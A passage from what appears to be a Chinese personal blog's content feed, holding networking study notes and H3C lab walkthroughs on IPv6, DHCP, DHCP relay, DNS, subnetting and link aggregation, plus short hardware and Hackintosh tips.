[AUTOCFG]</span><br></pre></td></tr></table></figure><p>　　<em>分析：PC3上已经自动生成了<code>2001::/64</code>网段的IPv6全球单播地址，而且链路本地地址也继续存在，用于网段内部通讯</em>　　</p><p>​3.<strong>测试R1和PC3是否能够使用全球单播地址互通</strong></p><p><em>步骤1：在PC3上Ping R1的IPv6全球单播地址，发现可以Ping通</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[PC3]Ping ipv6 2001::1</span><br><span class="line">Ping6(56 data bytes) 2001::824C:A1FF:FE05:305 --&gt; 2001::1, press CTRL_C to break</span><br><span class="line">56 bytes from 2001::1, icmp_seq=0 hlim=64 time=70.000 ms</span><br><span class="line">56 bytes from 2001::1, icmp_seq=1 hlim=64 time=14.000 ms</span><br><span class="line">56 bytes from 2001::1, icmp_seq=2 hlim=64 time=25.000 ms</span><br><span class="line">56 bytes from 2001::1, icmp_seq=3 hlim=64 time=17.000 ms</span><br><span class="line">56 bytes from 2001::1, icmp_seq=4 hlim=64 time=20.000 ms</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPV6基础</title>
      <link href="/posts/56210"/>
      <url>/posts/56210</url>
      
        <content type="html"><![CDATA[<br /><br /><p><img src="/images/%E6%91%84%E5%BD%B1%E7%85%A7%E7%89%87/%E6%91%84%E5%BD%B102.jpg"></p><br /><h2 id="IPv6基础"><a href="#IPv6基础" class="headerlink" title="IPv6基础"></a>IPv6基础</h2><h3 id="IPv4的问题"><a href="#IPv4的问题" class="headerlink" title="IPv4的问题"></a><em><strong>IPv4的问题</strong></em></h3><ul><li><code>地址资源已经全部耗尽</code></li><li><code>终端用户配置不够简便</code></li><li><code>协议本身不具备安全性和Qos特性</code></li></ul><p><code>QoS：是网络的一种安全机制, 是用来解决网络延迟和阻塞等问题的一种技术</code></p><h3 id="IPv6的优势"><a href="#IPv6的优势" class="headerlink" title="IPv6的优势"></a><em><strong>IPv6的优势</strong></em></h3><ul><li><code>几乎无尽的地址空间   3.4X10^38个可用地址</code></li><li><code>终端用户无需任何配置，甚至不需要DHCP</code></li><li><code>协议自带安全性和QOS特性</code></li></ul><h3 id="地址格式"><a href="#地址格式" class="headerlink" title="地址格式"></a><em><strong>地址格式</strong></em></h3><ul><li><code>冒号十六进制格式</code></li><li><code>每段16位，共8段，一共128位</code></li></ul><h3 id="地址书写压缩"><a href="#地址书写压缩" class="headerlink" title="地址书写压缩"></a><em><strong>地址书写压缩</strong></em></h3><p><em>段内前导0压缩</em></p><ul><li><code>段内前导的0可省略</code></li><li><code>全为0的段压缩为一个0</code></li></ul><p><em>全0段压缩</em></p><ul><li><code>连续为0的段可用::表示</code></li><li><code>一个IPv6地址内只允许使用一次全0段压缩</code></li></ul><p><img src="/images/IPv6%E5%9F%BA%E7%A1%80/01.jpg"></p><h3 id="网段划分"><a href="#网段划分" class="headerlink" title="网段划分"></a><em><strong>网段划分</strong></em></h3><p><img src="/images/IPv6%E5%9F%BA%E7%A1%80/02.jpg"></p><ul><li><p><code>前缀：前缀长度和数字一致则为同一网段</code></p></li><li><p><code>接口标识符</code></p><ul><li><p><code>根据MAC地址计算而来，全球唯一</code></p></li><li><p><code>手动配置</code></p></li></ul></li><li><p><code>前缀长度：标识前缀的长度</code></p></li></ul><h3 id="地址分类"><a href="#地址分类" class="headerlink" title="地址分类"></a><em><strong>地址分类</strong></em></h3><p><font size=6>单播地址</font></p><ul><li><p><em>未指定地址</em><code>::/128</code></p></li><li><p><em>本地环回地址</em><code>::1/128</code></p></li><li><p><em>链路本地地址 link-local address</em></p><ul><li><code>FE80::/10</code></li><li><code>仅用于同网段内部通讯，自动生成</code></li><li><code>FE80::接口标识符/10</code></li></ul></li></ul><p><img src="/images/IPv6%E5%9F%BA%E7%A1%80/03.jpg"></p><ul><li><em>站点本地地址</em><code>FEC0::/10、私有地址</code></li><li><em>全球单播地址</em>         <code>2000::/3</code></li></ul><p><font size=6>组播地址</font></p><p><code>标识组播地址</code></p><p><code>广播地址属于一种特殊的组播地址</code></p><p><font size=6>任播地址</font></p><p><code>用于智能寻路，寻找 最近的下一跳</code></p><p><code>从单播地址中分配</code></p><h3 id="IPv6邻居发现协议"><a href="#IPv6邻居发现协议" class="headerlink" title="IPv6邻居发现协议"></a><em><strong>IPv6邻居发现协议</strong></em></h3><p><code>地址解析，类似ARP</code></p><p><code>邻居关系建立和维持</code></p><p><code>路由器发现/前缀发现</code></p><p><code>地址自动配置</code></p><ul><li><code>1.终端发送RS消息，请求路由器的前缀和前缀长度</code></li><li><code>2.路由器回复本地的前缀和前缀长度</code></li><li><code>3.终端使用路由器回复的前缀+接口标识符/前缀长度，自动产生IPv6单播地址</code></li></ul><p><code>地址重复检测</code></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><em><strong>常用命令</strong></em></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[h3c-GigabitEthernet 0/0]ipv6 address &#x27;ipv6 address&#x27;配置静态IPv6地址</span><br><span class="line">[h3c-GigabitEthernet 0/0]ipv6 address auto配置为自动产生IPv6地址</span><br><span class="line">[h3c-GigabitEthernet 0/0]undo ipv6 nd ra halt解除路由器ND消息抑制</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EFI注入驱动文件</title>
      <link href="/posts/10017"/>
      <url>/posts/10017</url>
      
        <content type="html"><![CDATA[<br /><br /><ul><li><em><strong>1.打开OpenCore 挂载<code>EFI</code>分区</strong></em></li></ul><p><img src="/images/EFI%E6%B3%A8%E5%85%A5%E9%A9%B1%E5%8A%A8%E6%96%87%E4%BB%B6/01.jpg"></p><ul><li><em><strong>2.打开分区</strong></em></li></ul><p><img src="/images/EFI%E6%B3%A8%E5%85%A5%E9%A9%B1%E5%8A%A8%E6%96%87%E4%BB%B6/02.jpg"></p><ul><li><em><strong>3.驱动存放位置为<code>EFI/OC/kexts</code></strong></em></li><li><em><strong>4.新驱动移动到<code>kexts</code>文件夹中</strong></em></li><li><em><strong>5.返回上一级<code>EFI/oc/</code></strong></em></li><li><em><strong>6.打开<code>config.plist</code>，切换Kernel-内核设置</strong></em></li></ul><p><img src="/images/EFI%E6%B3%A8%E5%85%A5%E9%A9%B1%E5%8A%A8%E6%96%87%E4%BB%B6/03.jpg"></p><ul><li><em><strong>7.保存退出</strong></em></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑苹果 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP中继实验</title>
      <link href="/posts/12396"/>
      <url>/posts/12396</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/DHCP%E4%B8%AD%E7%BB%A7%E5%AE%9E%E9%AA%8C/01.jpg"></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1.按照图示配置IP地址</p><p>2.配置R1为DHCP服务器，能够跨网段为<code>192.168.2.0/24</code>网段自动分配IP地址。要求分配DNS地址为<code>202.103.24.68</code>和<code>202.103.0.117</code></p><p>3.PC3获取IP地址后，能够访问到<code>192.168.1.1</code></p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>配置IP地址部分略</strong></p><p>2.<strong>配置R1为DHCP服务器，能够跨网段为<code>192.168.2.0/24</code>网段自动分配IP地址</strong></p><p>　　<em>分析：默认情况下，DHCP只能为和本机处于同一网段的客户端分配IP地址。现在要求跨网段分配IP地址，就需要配置DHCP中继来实现<br>　　在R1上创建的地址池必须要宣告<code>192.168.2.0/24</code>网段。DHCP分配的网关地址应该是<code>192.168.2.0/24</code>网段的真实网关，根据拓扑得知，网关就是R2的g0&#x2F;1接口，IP地址为<code>192.168.2.254</code><br>　　DHCP的IP地址请求和应答报文都是广播形式发送，默认情况下，是无法穿越路由器的，所以需要在R2上开启DHCP中继功能，使DHCP报文能够跨网段转发<br>　　另外，<code>192.168.2.0/24</code>网段对R1来说，是非直连网段，要使R1和PC3连通，R1上必须具有到达<code>192.168.2.0/24</code>网段的路由信息</em><br>　<br><em>步骤1：在R1上开启DHCP功能，并创建<code>1</code>号DHCP地址池，宣告网段<code>192.168.2.0/24</code>，网关为<code>192.168.2.254</code>，DNS为<code>202.103.24.68</code>和<code>202.103.0.117</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R1]dhcp enable</span><br><span class="line">[R1]dhcp server ip-pool 1</span><br><span class="line">[R1-dhcp-pool-1]network 192.168.2.0 mask 255.255.255.0</span><br><span class="line">[R1-dhcp-pool-1]gateway-list 192.168.2.254</span><br><span class="line">[R1-dhcp-pool-1]dns-list 202.103.24.68 202.103.0.117</span><br></pre></td></tr></table></figure><p><em>步骤2:在R2上开启DHCP功能，并在连接客户端的接口（g0&#x2F;1）上开启DHCP中继功能，并指定DHCP服务器的IP地址</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R2]dhcp enable</span><br><span class="line">[R2]interface g0/1</span><br><span class="line">[R2-GigabitEthernet0/1]dhcp select relay</span><br><span class="line">[R2-GigabitEthernet0/1]dhcp relay server-address 192.168.1.1</span><br></pre></td></tr></table></figure><p><em>步骤3：在R1上配置默认路由，使R1的DHCP协议报文能够到达PC3</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 0.0.0.0 0 192.168.1.2</span><br></pre></td></tr></table></figure><p><em>步骤4：把PC3的IP地址模式设置为自动获取，发现可以获取到<code>192.168.2.0/24</code>网段的IP地址，如图所示</em></p><p><img src="/images/DHCP%E4%B8%AD%E7%BB%A7%E5%AE%9E%E9%AA%8C/02.jpg"></p><p>3.<strong>在PC3上<code>Ping 192.168.1.1</code>，确认可以Ping通</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;ping 192.168.1.1</span><br><span class="line">Ping 192.168.1.1 (192.168.1.1): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=0 ttl=254 time=22.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=1 ttl=254 time=51.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=2 ttl=254 time=21.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=3 ttl=254 time=43.000 ms</span><br><span class="line">56 bytes from 192.168.1.1: icmp_seq=4 ttl=254 time=34.000 ms</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP实验</title>
      <link href="/posts/54911"/>
      <url>/posts/54911</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><h4 id="产生背景"><a href="#产生背景" class="headerlink" title="产生背景"></a>产生背景</h4><ul><li><code>局域网中手动配置静态IP地址任务繁琐，而且容易出错</code></li></ul><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><ul><li><p><code>动态主机配置协议</code></p></li><li><p><code>用于为局域网中主机动态分配IP地址及相关信息</code></p></li><li><p><code>采用客户端/服务器模式</code></p></li><li><p><code>服务端口UDP67</code></p></li><li><p><code>客户端口UDP68</code></p></li></ul><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><h5 id="分配IP地址工作流程"><a href="#分配IP地址工作流程" class="headerlink" title="分配IP地址工作流程"></a>分配IP地址工作<em><strong>流程</strong></em></h5><p>​<code>1.客户端以全网广播形式发起IP地址寻找Discover</code></p><p>​<code>2.服务器以全网广播形式向客户端发送IP地址提供Offer</code></p><p>​<code>3.客户端选择好IP地址后，以全网广播形式向服务器请求选择结果Request</code></p><p>​<code>4.服务器向客户端以全网广播形式发送IP地址确认ACK</code></p><p><em><strong>特殊情况的处理</strong></em>：<code>当网络中存在多台DHCP服务器，客户端会优先选择最先到达的IP地址提供</code></p><p><em><strong>IP地址租约更新</strong></em>：</p><ul><li><code>租期到达50%，客户端如在线，会向服务器单播发起租约更新请求</code></li><li><code>租期到达87.5%，客户端如在线，会向服务器广播发起租约更新请求</code></li></ul><h5 id="DHCP中继代理"><a href="#DHCP中继代理" class="headerlink" title="DHCP中继代理"></a>DHCP中继代理</h5><ul><li><code>用于跨网段分配IP地址</code></li><li><code>IP地址请求的相关报文都是广播发送，无法跨越网段，所以需要在中间路由器开启DHCP中继代理功能</code></li></ul><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/DHCP%E5%AE%9E%E9%AA%8C/01.jpg"></p><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>1.按照图示为R1配置IP地址</p><p>2.配置R1为DHCP服务器，提供服务的地址池为<code>192.168.1.0/24</code>网段，网关为<code>192.168.1.254</code>，DNS服务器地址为<code>114.114.114.114</code></p><p>3.<code>192.168.1.10-192.168.1.20</code>为专用地址段，要求不能用于自动分配</p><p>4.PC3和PC4都能获取到<code>192.168.1.0/24</code>网段的IP地址</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>R1配置IP地址部分略</strong><code>192.168.1.1</code></p><p>2.<strong>配置R1的DHCP服务</strong></p><p><em>步骤1：在R1上开启DHCP服务</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]dhcp enable</span><br></pre></td></tr></table></figure><p><em>步骤2：创建<code>1</code>号地址池，宣告网段<code>192.168.1.0/24</code>，网关为<code>192.168.1.254</code>，DNS为<code>114.114.114.114</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R1]dhcp server ip-pool 1</span><br><span class="line">[R1-dhcp-pool-1]network 192.168.1.0 mask 255.255.255.0</span><br><span class="line">[R1-dhcp-pool-1]gateway-list 192.168.1.254</span><br><span class="line">[R1-dhcp-pool-1]dns-list 114.114.114.114</span><br></pre></td></tr></table></figure><p>3.配置IP地址排除</p><p>　　<em>分析：被配置为排除的IP地址段，DHCP服务器将不会进行分配。配置排除的命令需要退出到系统视图配置</em></p><p><em>步骤1：配置IP地址排除段，为<code>192.168.1.10-192.168.1.20</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]dhcp server forbidden-ip 192.168.1.10 192.168.1.20</span><br></pre></td></tr></table></figure><p>4.配置PC3和PC4的IP地址为自动获取，然后可以自动获得<code>192.168.1.0/24</code>网段的IP地址，如图所示</p><p><img src="/images/DHCP%E5%AE%9E%E9%AA%8C/02.jpg"></p><p><img src="/images/DHCP%E5%AE%9E%E9%AA%8C/03.jpg"></p><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROG STRIX B450-I更换网卡</title>
      <link href="/posts/61113"/>
      <url>/posts/61113</url>
      
        <content type="html"><![CDATA[<br /><p><img src="/images/%E6%9B%B4%E6%8D%A2%E7%BD%91%E5%8D%A1/01.jpg"></p><br /><p><em>原瑞昱(螃蟹)卡由于</em><em><strong>年度久远</strong></em></p><ul><li><p><code>蓝牙、wifi延迟高，降低使用体验</code></p></li><li><p><code>无法注入黑苹果驱动</code></p></li></ul><p><em>东寻西觅，找来找去，最后锁定了这款</em><code>英特尔Ax210</code>🧡</p><p><img src="/images/%E6%9B%B4%E6%8D%A2%E7%BD%91%E5%8D%A1/02.jpg"></p><p><strong>锁定无线网卡位置</strong>🤪</p><p><img src="/images/%E6%9B%B4%E6%8D%A2%E7%BD%91%E5%8D%A1/03.jpg"></p><p><img src="/images/%E6%9B%B4%E6%8D%A2%E7%BD%91%E5%8D%A1/04.jpg"><em>模块化设计真不错</em></p><p><img src="/images/%E6%9B%B4%E6%8D%A2%E7%BD%91%E5%8D%A1/05.jpg"></p><p><em><strong>安装驱动，测试</strong></em></p><p><img src="/images/%E6%9B%B4%E6%8D%A2%E7%BD%91%E5%8D%A1/06.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电脑玩家 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS</title>
      <link href="/posts/8835"/>
      <url>/posts/8835</url>
      
        <content type="html"><![CDATA[<br /><br /><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p><em><strong>产生背景</strong></em></p><ul><li>通过IP地址访问目标主机，不便于记忆</li><li>通过容易记忆的域名来标识主机位置</li></ul><p><em><strong>域名的树形层次化结构</strong></em></p><ul><li>根域         .     全球只有13台</li><li>顶级域   com.cn主机所处的国家&#x2F;区域，注册人的性质</li><li>二级域baidu  注册人自行创建的名称</li><li>主机名www区域内部的主机的名称，由注册人自行创建和管理</li></ul><p><em><strong>定义</strong></em>：用于域名和IP地址的互相解析</p><p><em><strong>DNS查询模式</strong></em></p><ul><li><p>递归查询：</p><ul><li>DNS服务器一定会返回一个确切的查询结果</li><li>客户端到DNS的查询</li></ul></li><li><p>迭代查询：</p><ul><li>DNS服务器会返回一个已知的其他DNS服务器，由请求者自行查询</li><li>DNS服务器到DNS服务器的查询</li></ul></li></ul><p><em><strong>H3C配置DNS代理</strong></em></p><ul><li>[h3c]dns proxy enable</li><li>[h3c]dns server ‘公网DNS地址’</li><li>内网终端DNS服务器指向为本路由器</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决华硕主板关机RGB灯亮</title>
      <link href="/posts/30180"/>
      <url>/posts/30180</url>
      
        <content type="html"><![CDATA[<br ><p><img src="/images/%E6%9D%82%E5%9B%BE/%E8%A1%A8%E6%83%85%E5%8C%8505.gif"></p><br/><p><strong>开机后进入点击<code>DEL</code>键进入BIOS界面，将Advanced-APM-Erp支持，开启即可</strong></p><p><img src="/images/%E8%A7%A3%E5%86%B3%E5%8D%8E%E7%A1%95%E4%B8%BB%E6%9D%BF%E5%85%B3%E6%9C%BARGB%E7%81%AF%E4%BA%AE/01.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电脑玩家 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP子网划分</title>
      <link href="/posts/61360"/>
      <url>/posts/61360</url>
      
        <content type="html"><![CDATA[<br /><h3 id="IP子网划分"><a href="#IP子网划分" class="headerlink" title="IP子网划分"></a>IP子网划分</h3><h4 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a><em>子网掩码</em></h4><ul><li><h5 id="产生背景"><a href="#产生背景" class="headerlink" title="产生背景"></a>产生背景</h5><ul><li><p><code>通过自然分类来划分网络规模会造成大量IP地址浪费</code></p></li><li><p><code>IPv4地址资源已经全部耗尽</code></p></li></ul></li><li><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><ul><li><code>由连续的二进制1或0组成的32位掩码，用来衡量IP地址网络位的长度</code></li><li><code>1对应的部分为网络位</code></li><li><code>0对应的部分位主机位</code></li></ul></li><li><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul><li><code>主类掩码: 和自然分类一致的子网掩码</code></li><li><code>VLSM:     可变长子网掩码，通过把子网掩码变长来把一个网段划分位多个子网</code></li><li><code>CIDR:      无类域间路由，通过把子网掩码缩短来把多个网段聚合为一个网段</code></li></ul></li></ul><h4 id="VLSM算法"><a href="#VLSM算法" class="headerlink" title="VLSM算法"></a><em>VLSM算法</em></h4><p>1.得出下列参数</p><ul><li><code>掩码借位数</code></li><li><code>掩码剩余位数</code></li><li><code>借位段掩码剩余位数</code></li></ul><p>2.计算划分结果</p><ul><li><code>划分子网数2^(借位数)</code></li><li><code>每个子网可用IP地址数2^（剩余位数）-2</code></li><li><code>每两个子网的间隔位数2^（本段剩余位数）</code></li></ul><p>3.列出每个子网</p><p><strong>举例1</strong></p><p>C类地址：<strong>192.168.1.0&#x2F;26</strong></p><ul><li>1.划分为几个子网</li><li>2.每个子网有多少地址可用</li><li>3.每个子网的地址起止范围，网络地址和广播地址</li></ul><p><em>得出下列参数：</em></p><ul><li>借位数：<strong>2</strong></li><li>剩余位数：<strong>6</strong></li></ul><p><em>计算：</em></p><p>1.划分子网数：<code>2^借位数=4</code></p><p>2.每个子网有多少地址可用：<code>2^剩余位数-2=62</code></p><p>3.子网范围列出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.0/26192.168.1.1-192.168.1.62192.168.1.63</span><br><span class="line">192.168.1.64/26192.168.1.65-192.168.1.126192.168.1.127</span><br><span class="line">192.168.1.128/26192.168.1.129-192.168.1.190192.168.1.191</span><br><span class="line">192.168.1.192/26192.168.1.193-192.168.1.254192.168.1.255</span><br></pre></td></tr></table></figure><p><strong>举例2</strong></p><p>B类地址：<strong>172.16.0.0&#x2F;18</strong></p><ul><li>1.划分为几个子网</li><li>2.每个子网有多少地址可用</li><li>3.每个子网的地址起止范围，网络地址和广播地址</li></ul><p><em>得出下列参数：</em></p><ul><li>借位数：<strong>2</strong></li><li>剩余位数：<strong>14</strong></li><li>借位段剩余位数：<strong>6</strong></li></ul><p><em>计算：</em></p><p>1.划分子网数：<code>2^借位数=4</code></p><p>2.每个子网有多少地址可用：<code>2^剩余位数-2=2^14-2=16382</code></p><p>3.每两个子网的间隔位数：<code>2^借位段剩余位数=64</code></p><p>4.子网范围列出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.16.0.0/18172.16.0.1-172.16.63.254172.16.63.255</span><br><span class="line">172.16.64.0/18172.16.64.1-172.16.127.254172.16.127.255</span><br><span class="line">172.16.128.0/18172.16.128.1-172.16.191.254172.16.191.255</span><br><span class="line">172.16.192.0/18172.16.192.1-172.16.255.254172.16.255.255</span><br></pre></td></tr></table></figure><h4 id="常见子网划分对应关系"><a href="#常见子网划分对应关系" class="headerlink" title="常见子网划分对应关系"></a><em>常见子网划分对应关系</em></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">25255.255.255.128126个可用地址</span><br><span class="line">26255.255.255.19262个可用地址</span><br><span class="line">27255.255.255.22430个可用地址</span><br><span class="line">28255.255.255.24014个可用地址</span><br><span class="line">29255.255.255.2486个可用地址</span><br><span class="line">30255.255.255.2522个可用地址</span><br><span class="line">31255.255.255.2542个可用地址PPP链路可用</span><br><span class="line">32255.255.255.2552个可用地址设备的Loopback接口可用</span><br></pre></td></tr></table></figure><h3 id="子网划分练习"><a href="#子网划分练习" class="headerlink" title="子网划分练习"></a>子网划分练习</h3><p>1.求下列地址的网络地址和广播地址</p><ul><li>172.16.10.255&#x2F;16</li></ul><p><strong>172.16.0.0   172.16.255.255</strong></p><br /><ul><li>192.168.1.47&#x2F;27</li></ul><p>解题思路：掩码位算出可用地址</p><p>192.168.1.0192.168.1.1-192.168.1.30192.168.1.31</p><p><strong>192.168.1.32 192.168.1.33-192.168.1.62192.168.1.63</strong></p><br /><p>2.请问下列地址是否可以分配给主机</p><ul><li>192.168.10.31&#x2F;28</li></ul><p>故192.168.10.31是广播地址</p><p>192.168.10.0192.168.10.1-192.168.10.14192.168.10.15</p><p><strong>192.168.10.16192.168.10.17-192.168.10.30192.168.10.31</strong></p><br /><ul><li>172.16.10.255&#x2F;19</li></ul><p>故172.16.10.255可以分配给主机</p><p><strong>172.16.0.0172.16.0.1-172.16.31.254172.16.31.255</strong></p><p>172.16.32.0  172.16.32.1-172.16.63.254172.16.63.255</p><br/><p>3.请问下列地址中那些地址在同一网段</p><ul><li>192.168.10.34&#x2F;28</li><li>192.168.10.53&#x2F;28</li><li>192.168.10.31&#x2F;28</li><li>192.168.10.61&#x2F;28</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.10.0192.168.10.1-192.168.10.14192.168.10.15</span><br><span class="line">192.168.10.16192.168.10.17-10.30192.168.10.31</span><br><span class="line">192.168.10.32192.168.10.33-10.46192.168.10.47</span><br><span class="line">192.168.10.48192.168.10.49-10.62192.168.10.63</span><br></pre></td></tr></table></figure><p>故192.168.10.53&#x2F;28、192.168.10.61&#x2F;28在同一网段</p><br /><p>4.在192.168.1.0&#x2F;24的C类主网络内，需要划分出1个可容纳100台主机的子网，1个可容纳50台主机的子网，2个可容纳25台主机的子网，应该如何划分？</p><p>请写出每个子网的网络号、子网掩码、容纳主机数量和广播地址？</p><p><img src="/images/IP%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/01.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链路聚合实验-静态</title>
      <link href="/posts/39536"/>
      <url>/posts/39536</url>
      
        <content type="html"><![CDATA[<br/><br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88%E5%AE%9E%E9%AA%8C-%E9%9D%99%E6%80%81/01.jpg"></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>​<font color=red>1.按照图示配置PC3和PC4的IP地址</font></p><p>​<font color=red>2.在SW1和SW2的两条直连链路上配置链路聚合，实现链路冗余，并可以增加传输带宽</font></p><p>​<font color=red>3.SW1和SW2之间的直连链路要配置为Trunk类型，允许所有vlan通过</font></p><p>​<font color=red>4.中断SW1和SW2之间的一条直连链路，测试PC3和PC4是否仍然能够继续访问</font></p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>​1.<strong>PC配置IP地址部分略</strong></p><p>​2.<strong>在SW1和SW2的直连链路上配置链路聚合</strong></p><p>　　<em>分析：SW1和SW2之间通过g1&#x2F;0&#x2F;1和g1&#x2F;0&#x2F;2接口直连，需要在两台交换机上分别创建聚合接口，并把g1&#x2F;0&#x2F;1和g1&#x2F;0&#x2F;2接口加入到聚合接口，形成链路聚合。被聚合的物理接口的vlan配置和接口类型要保持一致，所以在配置链路聚合前，物理端口不要做任何其他配置，保持默认状态即可</em></p><p><em>步骤1：在SW1上创建<code>Bridge-Aggregation 1</code>号聚合接口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface Bridge-Aggregation 1</span><br></pre></td></tr></table></figure><p><em>步骤2：进入g1&#x2F;0&#x2F;1和g1&#x2F;0&#x2F;2接口的接口视图，分别把两个接口加入到聚合接口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface g1/0/1</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port link-aggregation group 